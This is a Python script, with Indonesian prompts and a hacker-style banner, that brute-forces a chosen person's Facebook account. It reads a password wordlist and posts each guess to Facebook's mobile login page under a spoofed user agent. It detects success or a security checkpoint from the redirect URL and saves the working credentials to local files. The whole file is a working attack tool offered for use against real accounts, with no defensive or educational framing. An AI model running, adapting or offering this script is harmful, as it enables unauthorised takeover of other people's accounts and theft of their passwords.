import os
import sys
import time
import requests
import re

logo = """ \033[1;91m░██████╗░█████╗░██████╗░██╗░██████╗
          ██╔════╝██╔══██╗██╔══██╗██║██╔════╝
\033[1;97m       ╚█████╗░███████║██║░░██║██║╚█████╗░
          ░╚═══██╗██╔══██║██║░░██║██║░╚═══██╗
          ██████╔╝██║░░██║██████╔╝██║██████╔╝
          ╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░\033[1;97m
         [\033[41;1m ☆ Raka ☆ ™︻®╤───────═◍➤ \033[00;1m]
"""
os.system('clear')
print (logo)

def load():
	print('')


url = 'https://mobile.facebook.com/login.php'
headers = {
	  'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
}
hack = open('hack.txt','a')
chek = open('chek.txt','a')
 
def request():
	print('\033[92m╭────\033[91m[\033[97m Masukkan ID Target\033[91m ]')
	id = input('\033[92m╰────➲\033[93m ')
	print('\033[92m╭────\033[91m[ \033[97mMasukkan File Wordlist \033[92m( Bangsat.txt ) \033[91;1m]')
	wordlist = input('\033[92m╰────➲\033[93m ')
	password = open(wordlist,'r').readlines()
	print('\n\033[92mJumlah Password : ',len(password),'\n')
	for line in password:
		pw = line.strip()
		data = {
			'email':id,
			'pass':pw
		}
		r = requests.post(url,headers=headers,data=data)
		if('home.php?' in r.url or 'free' in r.url):
			hack1 = '\n\033[1;97m\033[1;44;97m BERHASIL \033[0m\n\033[1;97mUsername : '+id+'\n\033[1;97mPassword : '+pw
			print(hack1)
			hack.write(hack1)
			os.sys.exit()
		elif('checkpoint' in r.url):
			chek1 = '\n\033[1;97m\033[1;41;97m CHEKPOINT \033[0m\n\033[1;97mUsername : '+id+'\n\033[1;97mPassword : '+pw
			print(chek1)
			chek.write(chek1)
			os.sys.exit()
		else:
			print('')
			print('\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m : ',pw)
			
			
if __name__=='__main__':
	request()
	
